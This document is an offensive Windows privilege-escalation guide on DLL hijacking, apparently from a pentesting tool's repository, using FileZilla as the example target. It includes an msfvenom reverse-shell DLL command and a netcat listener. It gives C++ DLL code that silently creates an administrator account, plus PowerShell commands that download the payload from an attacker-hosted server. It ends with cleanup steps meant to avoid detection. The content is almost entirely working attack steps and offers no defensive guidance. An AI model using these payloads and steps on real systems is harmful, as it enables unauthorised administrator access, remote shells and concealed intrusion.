## DLL Hijacking

### Overview
Dynamic Link Libraries (DLLs) are essential components in Windows systems that provide shared functionality for applications and services. When an application or service looks for a required DLL, it follows a predefined **DLL search order**:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories listed in the PATH environment variable.

A misconfiguration or missing DLL can create an opportunity for **DLL Hijacking**, where a malicious DLL placed in a writable directory is loaded instead of the legitimate one. If the application runs with elevated privileges, the malicious DLL will execute with the same level of access.

---

### Step 1: Identify Writable Directories and Missing DLLs
First, identify directories where you have write permissions and locate missing DLLs being searched for by applications or services.

1. **Search for Writable Directories**:
   Run **WinRecon.ps1** to enumerate writable directories and check for vulnerable DLLs:
   - **Option 2**: Run Custom Recon - (Select which functions to enable).
   - **Option 18**: Perform DLL Hijacking checks against known vulnerable software and directories.

Example Output:

![image](https://github.com/user-attachments/assets/6639ec58-b090-4e72-9af0-687bc28daaa4)
![image](https://github.com/user-attachments/assets/475bbb6b-f128-4c6f-bf3f-b4c71f199678)


In this example, the `FileZilla` application directory is writable, and the program attempts to load `TextShaping.dll`, making it a potential candidate for DLL hijacking.

---

### Step 2: Confirm Writable Permissions
Verify that the identified directory allows you to write files:

```powershell
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

Check if the file was successfully created:
```powershell
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

If successful, you have sufficient permissions to place a malicious DLL in this directory.

---

#### Step 3: Create a Malicious DLL
-
  ### Option 1: Using msfvenom
  -
    On our attacker machine (e.g., Kali Linux), use `msfvenom` to generate a malicious executable that creates a new user and adds it to the Administrators group:

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o EnterpriseServiceOptional.dll
    ```
    ```bash
    nc -nlvp <LPORT>
    ```
-
  ### Option 2. Compile with the following C program:

  -
    #### Malicious DLL Code in C++:
    ```cpp
    #include <stdlib.h>
    #include <windows.h>

    BOOL APIENTRY DllMain(
    HANDLE hModule,// Handle to DLL module
    DWORD ul_reason_for_call,// Reason for calling function
    LPVOID lpReserved ) // Reserved
    {
        switch ( ul_reason_for_call )
        {
            case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
                i = system ("net user taskmgrsvc Password123! /add");
                i = system ("net localgroup administrators taskmgrsvc /add");
            break;
            case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
            case DLL_THREAD_DETACH: // A thread exits normally.
            break;
            case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
        }
        return TRUE;
    }
    ``` 
    #### Compile the DLL:
    On your Kali machine, cross-compile the DLL using `mingw-w64`:

    ```bash
    x86_64-w64-mingw32-gcc <File>.cpp --shared -o <File>.dll
    ```
    -
        **`--shared`**: Generates a DLL file.
---

### Step 4: Transfer the DLL to the Target Directory
Host the DLL on your attacker machine and download it to the writable directory on the target system:

1. Start a Python HTTP server:
   ```bash
   python3 -m http.server 80
   ```
2. On the target system, download the DLL using PowerShell:
   ```powershell
   iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'TextShaping.dll'
   ```
   ```powershell
   powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/TextShaping.dll', 'TextShaping.dll')"
   ```
3. Move File
   ```powershell
   move TextShaping.dll 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
   ```
4. Confirm the file exists:
   ```powershell
   ls 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
   ```

---

### Step 5: Trigger the DLL Hijacking
The DLL hijacking will occur when a higher-privileged user or system process runs the application. For example, when the `FileZilla` application is executed by an administrator or another user with elevated permissions, the malicious DLL will be loaded from the writable directory.

Wait for the application to be executed by someone with higher privileges.

---

### Step 6: Verify Exploitation
After the DLL executes, verify that the new user has been created and added to the Administrators group:

1. Check for the new user:
   ```powershell
   net user
   ```
2. Verify the Administrators group:
   ```powershell
   net localgroup administrators
   ```

**Output**:
```plaintext
User accounts for \TARGETSYSTEM
-------------------------------------------------------------------------------
Administrator            taskmgrsvc              DefaultAccount

Alias name     administrators
Members
-------------------------------------------------------------------------------
Administrator
taskmgrsvc
```

The output confirms that the malicious DLL was loaded, and the `taskmgrsvc` account was successfully added to the Administrators group.

---

### Cleanup
To avoid detection, clean up after exploitation:

1. Delete the malicious DLL:
   ```powershell
   del 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
   ```
2. Remove the created user:
   ```powershell
   net user taskmgrsvc /delete
   ```

---

### Notes:
- Missing DLLs provide a great opportunity for code execution, especially if the search order allows loading from writable directories.
- Always verify writable permissions before deploying malicious DLLs.

---

### References
- [HackTricks - DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

---
